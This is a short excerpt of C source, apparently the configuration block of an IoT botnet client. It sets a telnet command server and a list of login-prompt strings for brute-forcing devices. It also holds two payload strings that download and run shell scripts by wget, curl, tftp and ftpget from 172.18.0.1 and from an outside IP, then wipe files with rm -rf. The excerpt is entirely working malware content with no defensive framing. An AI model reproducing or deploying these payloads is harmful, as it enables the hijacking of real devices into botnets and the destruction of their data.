...
// CONFIG
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = { "172.18.0.1 :23" };
char* phone[] = {":", "ogin", "sername", "assword", "Linux", "9615-cdp", (char*)0};
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.18.0.1 /bins.sh; curl -O http://172.18.0.1 /bins.sh; /bin/busybox wget http://172.18.0.1 /bin.sh; /bin/busybox tftp 172.18.0.1  -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 172.18.0.1  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 172.18.0.1 ; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 94.177.230.28 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\r\n"; //Telnet Scanner Must implement Busybox.
...
char *phonepayload = "cd /tmp; rm -rf *; cd /tmp/; wget http://172.18.0.1 /bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://172.18.0.1/bins.sh; sh bins.sh; rm -rf bins.sh\r\n";
